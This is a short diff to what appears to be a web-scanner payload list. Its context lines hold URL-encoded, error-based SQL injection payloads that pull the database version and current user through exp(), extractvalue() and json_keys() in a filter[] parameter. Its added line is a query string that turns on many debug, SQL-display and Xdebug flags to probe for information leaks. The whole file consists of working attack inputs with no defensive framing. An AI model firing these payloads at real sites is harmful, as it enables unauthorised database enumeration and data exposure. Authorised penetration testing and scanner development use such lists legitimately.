@@ -78,3 +78,6 @@
 /?filter=1&filter[]=1&filter[]=1%20AND%20exp%28~%28SELECT%2AFROM%28SELECT%20version%28%29%29x%29%29--%20-&공통
 /?filter=1&filter[]=1&filter[]=1%20AND%20extractvalue%281%2Cconcat%280x7e%2C%28SELECT%20current_user%28%29%29%29%29--%20-&공통
 /?filter=1&filter[]=1&filter[]=1%20AND%20json_keys%28concat%28%27%7B%22%27%2Cversion%28%29%2C%27%22%3A1%7D%27%29%29--%20-&공통
+
+
+/?_debug=1&debug=true&debug=1&_show_sql=1&show_errors=1&verbose=true&_exception=verbose&trace=1&XDEBUG_SESSION=JACKPOT&display_errors=on&app_debug=true&APP_DEBUG=1&test=1&dev=1&environment=dev
